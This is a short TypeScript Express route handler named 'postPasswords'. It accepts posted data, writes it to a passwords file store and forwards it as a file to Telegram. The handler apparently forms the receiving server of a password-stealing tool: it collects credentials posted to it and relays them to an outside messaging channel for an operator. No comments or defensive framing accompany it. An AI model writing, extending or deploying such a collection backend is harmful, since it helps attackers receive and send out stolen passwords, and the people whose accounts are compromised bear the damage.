import { Request, Response } from "express";

import { writeStore, passwordsFilePath } from "../../store.js";
import { sendTelegramFile } from "../../api/telegram/sendFile.js";

export function postPasswords(req: Request, res: Response) {
  const requestData = req.body.data;
  const data = JSON.stringify(requestData, null, 4);

  writeStore(data);

  sendTelegramFile(data);

  res.sendStatus(200);
}
